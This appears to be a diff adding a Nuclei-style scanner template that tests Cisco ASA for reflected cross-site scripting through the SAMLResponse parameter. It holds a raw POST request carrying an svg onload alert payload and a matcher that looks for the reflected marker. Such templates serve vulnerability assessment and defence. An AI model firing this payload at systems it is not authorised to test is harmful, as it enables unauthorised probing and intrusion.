@@ -1,0 +1,30 @@
+id: Cisco ASA XSS
+
+info:
+  name: Cisco ASA XSS with vulnerable parameter SAMLResponse
+  author: shifacyclewala & hackergautam
+  severity: medium
+  tags: xss,cisco
+
+requests:
+  - raw:
+      - |
+        POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 43
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        SAMLResponse="><svg/onload=alert('randomxss')>
+
+
+    redirects: true
+    max-redirects: 2
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "randomxss"
+        part: body
+        condition: and
+
